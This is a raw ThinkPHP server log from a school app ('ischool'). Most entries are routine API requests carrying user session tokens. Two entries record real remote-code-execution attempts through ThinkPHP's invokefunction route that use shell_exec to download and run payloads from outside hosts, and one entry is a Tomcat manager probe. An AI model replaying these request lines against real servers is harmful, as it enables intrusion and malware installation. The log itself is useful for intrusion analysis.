---------------------------------------------------------------
[ 2019-02-08T00:15:07+08:00 ] 5.160.131.13 GET 148.70.73.177:80/
[运行时间：0.011835s] [吞吐率：84.49req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T00:54:49+08:00 ] 185.172.110.88 GET 148.70.73.177:80/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://185.244.25.159/bins/x86;%20chmod%20777%20x86;./x86%20thinkphp
[运行时间：0.016387s] [吞吐率：61.02req/s] [内存消耗：1,366.35kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Go-http-client/1.1',
  'host' => '148.70.73.177:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'shell_exec',
    1 => 
    array (
      0 => 'wget http://185.244.25.159/bins/x86; chmod 777 x86;./x86 thinkphp',
    ),
  ),
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T01:15:35+08:00 ] 117.136.30.215 POST 148.70.73.177/api/banner/showBanner
[运行时间：0.157802s] [吞吐率：6.34req/s] [内存消耗：2,737.05kb] [文件加载：55]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'banner',
    2 => 'showBanner',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '131',
  'accept-language' => 'zh-Hans-CN;q=1',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '1CCA266C-52FE-4039-9E08-89367EF6A637',
  'number' => '-1',
  'tk' => 'df9b9e8feb74266ebc512673c00caf49',
  'type' => '1',
  'user_id' => '30',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\api\controller\Banner->showBanner[ /data/web/php/ischool/application/api/controller/Banner.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.045758s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `banner` [ RunTime:0.016465s ]
[ sql ] [ SQL ] SELECT `banner_id`,`url` FROM `banner` WHERE  `type` = 1  AND `status` = 1 ORDER BY `banner_id` DESC [ RunTime:0.000414s ]
---------------------------------------------------------------
[ 2019-02-08T01:16:32+08:00 ] 117.136.30.215 POST 148.70.73.177/api/sociality/getModule
[运行时间：0.025051s] [吞吐率：39.92req/s] [内存消耗：1,784.80kb] [文件加载：42]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'sociality',
    2 => 'getModule',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '114',
  'accept-language' => 'zh-Hans-CN;q=1',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '1CCA266C-52FE-4039-9E08-89367EF6A637',
  'tk' => 'df9b9e8feb74266ebc512673c00caf49',
  'user_id' => '30',
)
[ info ] [ CACHE ] INIT File
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T01:16:32+08:00 ] 117.136.30.215 POST 148.70.73.177/api/sociality/serveObtain
[运行时间：0.019067s] [吞吐率：52.45req/s] [内存消耗：1,784.80kb] [文件加载：42]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'sociality',
    2 => 'serveObtain',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '114',
  'accept-language' => 'zh-Hans-CN;q=1',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '1CCA266C-52FE-4039-9E08-89367EF6A637',
  'tk' => 'df9b9e8feb74266ebc512673c00caf49',
  'user_id' => '30',
)
[ info ] [ CACHE ] INIT File
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T01:16:32+08:00 ] 117.136.30.215 POST 148.70.73.177/api/sociality/playsObtain
[运行时间：0.020154s] [吞吐率：49.62req/s] [内存消耗：1,784.80kb] [文件加载：42]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'sociality',
    2 => 'playsObtain',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '114',
  'accept-language' => 'zh-Hans-CN;q=1',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '1CCA266C-52FE-4039-9E08-89367EF6A637',
  'tk' => 'df9b9e8feb74266ebc512673c00caf49',
  'user_id' => '30',
)
[ info ] [ CACHE ] INIT File
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T01:16:32+08:00 ] 117.136.30.215 POST 148.70.73.177/api/banner/showBanner
[运行时间：0.071151s] [吞吐率：14.05req/s] [内存消耗：2,736.90kb] [文件加载：55]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'banner',
    2 => 'showBanner',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '131',
  'accept-language' => 'zh-Hans-CN;q=1',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '1CCA266C-52FE-4039-9E08-89367EF6A637',
  'number' => '-1',
  'tk' => 'df9b9e8feb74266ebc512673c00caf49',
  'type' => '2',
  'user_id' => '30',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\api\controller\Banner->showBanner[ /data/web/php/ischool/application/api/controller/Banner.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000392s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `banner` [ RunTime:0.000710s ]
[ sql ] [ SQL ] SELECT `banner_id`,`url` FROM `banner` WHERE  `type` = 2  AND `status` = 1 ORDER BY `banner_id` DESC [ RunTime:0.000352s ]
---------------------------------------------------------------
[ 2019-02-08T02:14:34+08:00 ] 14.17.3.64 GET 148.70.73.177/index.php
[运行时间：0.016353s] [吞吐率：61.15req/s] [内存消耗：1,245.49kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '148.70.73.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T02:53:59+08:00 ] 186.250.116.170 GET 148.70.73.177:80/
[运行时间：0.034062s] [吞吐率：29.36req/s] [内存消耗：1,243.09kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T03:06:16+08:00 ] 103.23.237.224 GET 148.70.73.177:80/
[运行时间：0.017009s] [吞吐率：58.79req/s] [内存消耗：1,243.09kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T07:59:15+08:00 ] 194.88.153.43 GET 148.70.73.177:80/
[运行时间：0.073436s] [吞吐率：13.62req/s] [内存消耗：1,243.09kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T08:00:37+08:00 ] 185.244.25.128 GET 148.70.73.177:80/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.ga/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
[运行时间：0.053664s] [吞吐率：18.63req/s] [内存消耗：1,366.54kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Go-http-client/1.1',
  'host' => '148.70.73.177:80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'shell_exec',
    1 => 
    array (
      0 => 'wget http://infinityondemand.ga/bins/infinity.sh; chmod  x infinity.sh; sh infinity.sh ',
    ),
  ),
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T09:30:48+08:00 ] 5.58.35.222 GET 148.70.73.177:80/
[运行时间：0.017332s] [吞吐率：57.70req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T11:14:15+08:00 ] 82.209.201.182 GET 148.70.73.177:80/manager/html
[运行时间：0.044718s] [吞吐率：22.36req/s] [内存消耗：1,367.95kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'authorization' => 'Basic Og==',
  'host' => '148.70.73.177:80',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'accept' => 'text/html, application/xhtml+xml, */*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T11:39:13+08:00 ] 120.132.3.65 GET www.qq.com/404/search_children.js
[运行时间：0.013497s] [吞吐率：74.09req/s] [内存消耗：1,365.48kb] [文件加载：35]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => 'search_children.js',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36',
  'pragma' => 'no-cache',
  'accept' => '*/*',
  'host' => 'www.qq.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T11:48:37+08:00 ] 80.44.48.181 GET 148.70.73.177:80/
[运行时间：0.017515s] [吞吐率：57.09req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T13:11:04+08:00 ] 58.251.121.185 GET 148.70.73.177/
[运行时间：0.010898s] [吞吐率：91.76req/s] [内存消耗：1,245.48kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '148.70.73.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T13:27:36+08:00 ] 89.161.66.177 GET 148.70.73.177:80/
[运行时间：0.012179s] [吞吐率：82.11req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T14:44:29+08:00 ] 117.136.30.12 POST 148.70.73.177/api/banner/showBanner
[运行时间：0.165280s] [吞吐率：6.05req/s] [内存消耗：2,737.34kb] [文件加载：55]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'banner',
    2 => 'showBanner',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '131',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'number' => '-1',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'type' => '1',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\api\controller\Banner->showBanner[ /data/web/php/ischool/application/api/controller/Banner.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.065219s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `banner` [ RunTime:0.016283s ]
[ sql ] [ SQL ] SELECT `banner_id`,`url` FROM `banner` WHERE  `type` = 1  AND `status` = 1 ORDER BY `banner_id` DESC [ RunTime:0.000513s ]
---------------------------------------------------------------
[ 2019-02-08T14:44:32+08:00 ] 117.136.30.12 POST 148.70.73.177/api/banner/showBanner
[运行时间：0.067266s] [吞吐率：14.87req/s] [内存消耗：2,737.19kb] [文件加载：55]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'banner',
    2 => 'showBanner',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '131',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'number' => '-1',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'type' => '2',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\api\controller\Banner->showBanner[ /data/web/php/ischool/application/api/controller/Banner.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.006446s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `banner` [ RunTime:0.001135s ]
[ sql ] [ SQL ] SELECT `banner_id`,`url` FROM `banner` WHERE  `type` = 2  AND `status` = 1 ORDER BY `banner_id` DESC [ RunTime:0.001840s ]
---------------------------------------------------------------
[ 2019-02-08T14:44:32+08:00 ] 117.136.30.12 POST 148.70.73.177/api/sociality/playsObtain
[运行时间：0.069914s] [吞吐率：14.30req/s] [内存消耗：2,650.24kb] [文件加载：54]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'sociality',
    2 => 'playsObtain',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '114',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ RUN ] app\api\controller\Sociality->playsObtain[ /data/web/php/ischool/application/api/controller/Sociality.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.010691s ] mysql:host=127.0.0.1;port=3306;dbname=ischool;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `users` [ RunTime:0.000829s ]
[ sql ] [ SQL ] SELECT `school` FROM `users` WHERE  `user_id` = 34 LIMIT 1 [ RunTime:0.000303s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `sociality_type` [ RunTime:0.000441s ]
[ sql ] [ SQL ] SELECT `st`.`id`,`st`.`type_name` FROM `sociality_type` `st` WHERE  `pid` = 2 [ RunTime:0.000238s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `s_sociality_type` [ RunTime:0.000429s ]
[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 6 [ RunTime:0.000218s ]
[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 7 [ RunTime:0.001987s ]
[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 8 [ RunTime:0.000238s ]
[ sql ] [ SQL ] SELECT `id` FROM `s_sociality_type` WHERE  `type_id` = 9 [ RunTime:0.001102s ]
[ sql ] [ SQL ] SHOW COLUMNS FROM `plays` [ RunTime:0.000767s ]
[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 9,11 ) and u.school=1 )  AND `p_start` > 1549608272  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.002054s ]
[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 6 ) and u.school=1 )  AND `p_start` > 1549608272  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.001598s ]
[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 7 ) and u.school=1 )  AND `p_start` > 1549608272  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.000622s ]
[ sql ] [ SQL ] SELECT `p`.`plays_id`,`p`.`event_title`,`sst`.`type_name`,`u`.`head_image`,`p`.`user_id`,`u`.`nickname`,`us`.`grade`,`p`.`launch`,`p`.`funds`,`p`.`images`,`p`.`p_start`,`p`.`end_times`,`u`.`sex`,`p`.`p_address`,`p`.`number`,`p`.`ask` FROM `plays` `p` LEFT JOIN `s_sociality_type` `sst` ON `p`.`about_type_id`=`sst`.`id` LEFT JOIN `sociality_type` `st` ON `st`.`id`=`sst`.`type_id` LEFT JOIN `users` `u` ON `p`.`user_id`=`u`.`user_id` LEFT JOIN `users_secretary` `us` ON `u`.`user_id`=`us`.`user_id` WHERE  (   p.about_type_id in ( 8 ) and u.school=1 )  AND `p_start` > 1549608272  AND `p`.`status` = 1 ORDER BY `p`.`launch` DESC LIMIT 0,3 [ RunTime:0.012339s ]
---------------------------------------------------------------
[ 2019-02-08T14:44:32+08:00 ] 117.136.30.12 POST 148.70.73.177/api/sociality/serveObtain
[运行时间：0.093583s] [吞吐率：10.69req/s] [内存消耗：2,631.72kb] [文件加载：54]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'api',
    1 => 'sociality',
    2 => 'serveObtain',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate',
  'content-length' => '114',
  'accept-language' => 'zh-Hans-CN;q=1, en-CN;q=0.9',
  'user-agent' => 'iSchool/1.0 (iPhone; iOS 12.1.2; Scale/3.00)',
  'accept' => '*/*',
  'connection' => 'keep-alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'host' => '148.70.73.177',
)
[ info ] [ PARAM ] array (
  'app_os' => 'IOS',
  'app_version' => '1.0',
  'cid' => '9F8FF8BD-9C55-429C-862C-37F73A170A17',
  'tk' => '6b9e4ea64657e592048de016ed206209',
  'user_id' => '34',
)
[ info ] [ CACHE ] INIT File
[ info ] [ RUN ] app\api\controller\Sociality->serveObtain[ /data/web/php/ischool/application/api/controller/Sociality.php ]
[ info ] [ DB ] INIT mysql
